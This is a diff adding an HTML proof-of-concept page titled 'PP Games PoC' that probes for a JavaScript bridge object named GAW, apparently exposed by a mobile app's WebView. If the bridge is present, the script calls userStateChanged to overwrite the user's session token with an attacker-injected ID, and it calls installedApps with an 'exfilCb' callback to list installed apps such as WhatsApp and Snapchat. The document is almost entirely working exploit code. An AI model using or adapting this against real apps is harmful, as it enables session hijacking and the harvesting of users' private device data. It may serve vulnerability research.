@@ -1,0 +1,13 @@
+<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><title>Games</title></head><body style="background:#111;color:#0f0;font-family:monospace;padding:20px"><h2>PP Games PoC</h2><pre id="out">probing GAW bridge...</pre><script>
+var o=document.getElementById("out");
+function log(m){o.textContent+="
+"+m}
+try{
+  if(window.GAW){
+    log("GAW bridge PRESENT");
+    try{ GAW.userStateChanged(true, 123456, "ATTACKER-INJECTED-SSOID-xyz", "UK", "attacker", "en"); log("userStateChanged() CALLED -> session token overwritten with ATTACKER-INJECTED-SSOID-xyz"); }catch(e){ log("userStateChanged err "+e) }
+    try{ GAW.installedApps("exfilCb", "com.whatsapp", "com.twitter.android", "com.snapchat.android"); log("installedApps() CALLED - callback armed"); }catch(e){ log("installedApps err "+e) }
+    try{ window.exfilCb=function(list, market){ log("installedApps CALLBACK -> "+JSON.stringify(list)); }; }catch(e){}
+  } else { log("no GAW on this page"); }
+}catch(e){ log("ERR "+e) }
+</script></body></html>
